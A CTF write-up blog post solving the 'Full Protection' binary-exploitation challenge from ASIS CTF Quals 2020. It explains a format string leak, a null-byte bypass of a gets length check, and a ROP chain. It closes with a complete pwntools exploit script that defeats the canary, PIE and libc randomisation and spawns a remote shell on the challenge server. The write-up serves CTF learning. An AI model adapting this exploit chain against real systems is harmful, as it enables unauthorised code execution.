<h2>Full Protection - ASIS CTF Quals</h2>
<p>05/07/2020</p>

<p>
In this post I am going to solve the "Full Protection" challenge from ASIS
CTF Quals 2020. We are given two <a href="asis.txz">files</a>: <b>chall</b>
and <b>libc-2.27.so</b>. Let's see what protections does <b>chall</b> has.
</p>

<pre>
$ checksec ./chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</pre>


<p>
Here is what these protections mean (roughly):

<ul>
<li>RELRO ensures that the GOT can't be overwritten.</li>
<li>Canary ensures that the return address can't be overwritten, so we can't control RIP.</li>
<li>NX bit ensures that each segment is W^X, so we can't run our shellcode on the stack.</li>
<li>PIE ensures that the binary base is different each time we run it.</li>
<li>FORTIFY ensures that functions like printf don't get to read memory into far off places.</li>
</ul>

</p>

<p>
Now we can go ahead and see what the program does by decompiling it in
Ghidra. Looks like an infinite loop of reading and echoing user input.
</p>

<pre>
undefined8 main(void)
{
  -snip-
  while(true) {
    iVar1 = readline(&amp;local_58,0x40);
    if (iVar1 == 0) break;
    __printf_chk(1,&amp;local_58);
    _IO_putc(10,stdout);
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
  __stack_chk_fail();
}
</pre>

<p>
We can see a printf which takes our user input (local_58) that has been
read through the readline (see below) and prints it without any format
arguments, which means that there is a format string vulnerability.
</p>

<p>
Despite that, we still won't be able to use the offset notation because it
is __printf_chk. We can test our assumptions by running the program and
providing format specifiers as input.
</p>


<pre>
$ ./chall
AAAA.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x
AAAA.2240e360.0.2240e360.0.41414141.252e7825.252e7825.2578252e2e78252e.0.0.0
</pre>

<p>
We already have a format string vulnerability, but we can't do much with
it right now except leaking the stack up to a limited extent. Let's go
ahead and decompile the readline function.
</p>

<pre>
void readline(char *param_1,int param_2)
{
  size_t sVar1;
  
  gets(param_1);
  sVar1 = strlen(param_1);
  if ((int)sVar1 &lt; param_2) {
    return;
  }
  puts("[FATAL] Buffer Overflow");
  _exit(1);
}
</pre>

<p>
We have gets! Which means that there will be no boundary check for the
user input. But unfortunately right afterwards there is a check using
strlen. We can see in the decompilation of main above that the value
passed into param_2 is 0x40 which means our buffer can only be 64
characters long.
</p>

<p>
But the interesting thing is that while strlen terminates after
encountering a null byte, gets stops at newlines. So for example if our
input is \x00AAAA\n, strlen will say that the length is zero, but the four
A's will still be stored on the stack. So we can trick the length check
and overflow the return address of the main function (since the buffer is
stored in main, readline only contains the pointer to it). The amount of
characters to input in order to redirect the control flow was figured out
using dynamic analysis through gdb.
</p>

<p>
The only issue is that before overflowing the return address, the canary
gets overflown too. So we first need to leak the canary and append it to
our input. We need to see at what offset from the format string is the
canary located, this can be done dynamically. We first observe the lines
where the canary is being set, we break on it and inspect to get the
value.
</p>

<pre>
(gdb) disas main
-snip-
   0x0000000000000859 &lt;+9&gt;:	mov    rax,QWORD PTR fs:0x28
   0x0000000000000862 &lt;+18&gt;:	mov    QWORD PTR [rsp+0x48],rax
-snip-
(gdb) b *main+18
Breakpoint 1 at 0x555555554862
(gdb) r
Breakpoint 1, 0x0000555555554862 in main ()
=&gt; 0x0000555555554862 &lt;main+18&gt;:	48 89 44 24 48	mov    QWORD PTR [rsp+0x48],rax
(gdb) i r rax
rax            0x8307ee9bdbab600   590111093561144832
</pre>

<p>
We can see that the canary value is 0x8307ee9bdbab600 now we can keep
on putting %p's in our format string until we see the canary echoed back
to us. Once we have that, we can write the canary onto the stack with the
gets overflow, to prevent stack smashing detection.
<p>

</p>
Now that we can point RIP to anything we want, we still have some issues.
Since the binary's and libc's address keep changing on each execution, we
need to first leak their bases. This can be done using the format string
vulnerability as well. After some more time with gdb, I figured out that
the canary is at offset 12 and the binary is at offset 18 from the format
string. We need to mask the lower three nibbles (4KB) to get the base for
the binary from the extracted address. We can leak libc using a simple
pop rdi gadget that we can find within the binary and use it to leak
puts and consequently libc.
</p>

<p>
Once we have libc for our ROP, we can easily spawn a shell by passing
"/bin/sh" into RDI and calling system.
</p>

<p>
A few things to keep in mind:
<ul>
<li>Make sure to call system and not just jump to it.</li>
<li>libc can be leaked directly from the stack, no need to leak binary.</li>
<li>Canaries can be found using the canary command in some gdb wrappers.</li>
<li>This binary uses an alarm which makes it harder to debug, so patch it.</li>
</ul>
</p>

<p>
The final exploit script:
</p>

<pre>
from pwn import *

fn = './chall'
r = remote('69.172.229.147',9002)

# leaking canary
r.sendline('%p-'*20)
fmt = r.recvline().split(b'-')
canary = int(fmt[-8],16)
pie = int(fmt[-2],16) & 0xfffffffffffff000
offset = b'\x00' + b'A'*71 + p64(canary) + b'A'*8

# leaking libc base
rop = ROP(fn)
elf = ELF(fn,checksec=False)
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']

rop1 = offset + p64(pie+pop_rdi) + p64(pie+puts_got) + p64(pie+puts_plt) + p64(pie+main_plt)

r.sendline(rop1)
leak = u64(r.recvline().rstrip().ljust(8, b'\x00'))
libc = ELF('./libc-2.27.so', checksec=False)
libc.address = leak - libc.symbols['puts']

# spawning a shell
binsh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']
exit = libc.sym['exit']

#0x439c8 : pop rax ; ret
#0x21b95 : call rax
rop2 = offset + p64(pie+pop_rdi) + p64(binsh) + p64(libc.address+0x439c8) + p64(system) + p64(libc.address+0x21b95)
r.sendline(rop2)
r.interactive()
</pre>

Running the script:

<pre>
$ python3 sol.py 
[+] Opening connection to 69.172.229.147 on port 9002: Done
-snip-
[*] Switching to interactive mode
$ ls
chall
flag.txt
redir.sh
$ cat flag.txt
ASIS{s3cur1ty_pr0t3ct10n_1s_n07_s1lv3r_bull3t}
</pre>

<p>
Flag: <b>ASIS{s3cur1ty_pr0t3ct10n_1s_n07_s1lv3r_bull3t}</b>
</p>
